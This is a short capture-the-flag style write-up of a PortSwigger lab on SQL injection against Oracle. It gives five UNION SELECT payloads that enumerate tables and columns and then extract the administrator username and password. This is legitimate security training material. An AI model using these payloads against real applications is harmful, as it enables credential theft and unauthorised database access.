`'+UNION+SELECT+NULL,NULL+FROM+DUAL--`
`'+UNION+SELECT+'a','b'+FROM+DUAL--`
`'+UNION+SELECT+table_name,NULL+FROM+all_tables-- `
`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_yourstring'--`
`'+UNION+SELECT+USERNAME_yourstring,PASSWORD_yourstring+FROM+USERS_yourstring--`
## Metadata

- **Difficulty:** Practitioner 
- **Category:** SQL Injection
- **Lab URL:** [Lab: SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
- **Date Solved:** 3/4/2026

This is basically [Writeup for lab-listing-database-contents-non-oracle](../lab-listing-database-contents-non-oracle/writeup.md) with syntax differences between MySQL and Oracle, so read that writeup for detailed **Vulnerability Summary**, **Exploitation Steps** and **Remediation** sections, which are applicable to this lab.
## Payload used

In this order:
1. `'+UNION+SELECT+NULL,NULL+FROM+DUAL--`: find the number of columns returned by the original query
2. `'+UNION+SELECT+'a','b'+FROM+DUAL--`: find the column(s) that accept string data in the original query
3. `'+UNION+SELECT+table_name,NULL+FROM+all_tables-- `: list the names of all the tables in the database. The goal is to find the exact name of the table that contains login credentials. It's a table with prefix `USERS_`
4. `'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_yourstring'--`: After obtaining the name of the table in Step 3, we list all the names of the columns of that table to find the exact column names that contains username and password information.
5. `'+UNION+SELECT+USERNAME_yourstring,PASSWORD_yourstring+FROM+USERS_yourstring--`: having obtained everything, we now perform a trivial `UNION SELECT` statement to list the data of the columns that contain username and password information. Since data come in pairs, the username `administrator` is going to be followed by the password. Copy that password.
6. Go on the website, type in the credentials you just obtained. Lab is solved!
